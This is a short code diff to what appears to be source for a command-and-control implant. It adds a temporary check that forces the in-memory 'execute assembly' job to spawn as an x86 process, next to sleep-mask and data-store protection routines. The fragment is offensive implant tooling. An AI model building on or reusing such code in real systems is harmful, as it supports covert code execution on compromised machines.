@@ -9,6 +9,7 @@
 #include "gargleint.h"
 #include "hostprof.h"
 #include "syscalls.h"
+#include "cmd117_probe.h"
 
 extern char sleepmask_region[];
 
@@ -442,6 +443,9 @@ void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BO
 	}
 	x86 = (inner_type == 70 || inner_type == 87);
 	ignoreToken = (inner_type == 70 || inner_type == 71);
+	/* TEMP cmd117 experiment: if force pipe is listening, spawn same-arch x86 job (not a permanent fix). */
+	if (cmd117_force_x86_job())
+		x86 = TRUE;
 	command_job_spawn_logic(jtype, wait, offset, dll, (DWORD)dlllen, extra.buffer, extra.length, desc, dlen, x86, ignoreToken);
 	BeaconDataStoreProtectItem((size_t)index);
 }
